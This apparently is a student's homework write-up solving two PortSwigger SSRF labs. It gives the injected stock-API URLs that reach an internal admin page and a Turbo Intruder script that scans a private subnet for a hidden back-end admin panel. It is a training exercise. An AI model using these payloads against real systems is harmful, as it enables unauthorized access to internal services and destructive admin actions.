# Homework 10. Server-side attacks. Part 3

## SSRF

### Task 1. Basic SSRF against the local server

The [lab](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

The target web application requests third-party stocks to get product number.  
The stock url is passed as request parameter, so it  can be changed to:

```bash
http://localhost/admin
```

![lab1-request-1](lab1-request-1.png)

The server responded with admin page:

![lab1-response-1](lab1-resposne-1.png)

From the page source take `Delete` button url:

![lab1-path](lab1-path.png)

And execute `stock` request again with this path:

![lab1-request-2](lab1-request-2.png)

The lab is solved ðŸŽ‰

### Task 2. Basic SSRF against another back-end system

The [lab](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

This time the admin panel located on another server within private network `192.168.0.X`.

First of all we have to find the server ip address.
It could by last ip octet enumeration from 1 to 255.  
I've used `Turbo Intruder` Burp extension for that with configuration:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1000,
                           pipeline=False,
                           engine=Engine.THREADED
                           )
                           
    for i in range(1, 256):
         engine.queue(target.req, i)

def handleResponse(req, interesting):
    table.add(req)
```

and request:

```http

stockApi=http://192.168.0.%s:8080/admin
```

The server is located on `192.168.0.144`

![lab2-response-1](lab2-response-1.png)

Take `Delete` button path from page source:

![lab2-path](lab2-path.png)

And execute `stock` request with with path as `stockApi`:

![lab2-request-2](lab2-request-2.png)

The lab is solved ðŸŽ‰
